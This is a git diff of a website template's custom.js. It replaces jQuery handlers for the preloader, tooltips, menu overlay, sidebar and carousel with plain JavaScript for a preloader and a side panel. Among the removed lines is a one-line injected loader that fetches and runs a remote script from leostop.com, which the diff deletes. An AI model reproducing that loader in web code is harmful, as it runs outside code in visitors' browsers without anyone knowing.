@@ -2,61 +2,23 @@
     File Name: custom.js
 ---------------------------------------------------------------------*/
 
-$(function () {
+/* Preloader */
+var loaderBg = document.querySelector('.loader_bg')
 
-	"use strict";
+window.onload = function(){
+    setTimeout(function(){
+		loaderBg.style.display = 'none';
+    }, 500); // Puedes cambiar el tiempo cada mil es 1 segundo.
+}
 
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+// Sidepanel
 
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 300);
+var sidepanel = document.getElementById("mySidepanel");
 
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+openBtn.addEventListener("click", function() {
+	sidepanel.style.width = "250px";
+});
 
-	$(document).ready(function () {
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-
-
-
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$(".main-menu ul li.megamenu").mouseover(function () {
-			if (!$(this).parent().hasClass("#wrapper")) {
-				$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function () {
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-
-
-
-
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-
-	$(document).ready(function () {
-		$('#sidebarCollapse').on('click', function () {
-			$('#sidebar').toggleClass('active');
-			$(this).toggleClass('active');
-		});
-	});
-
-	/* Product slider 
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	// optional
-	$('#blogCarousel').carousel({
-		interval: 5000
-	});
-
-
+closeBtn.addEventListener("click", function() {
+	sidepanel.style.width = "0";
 });
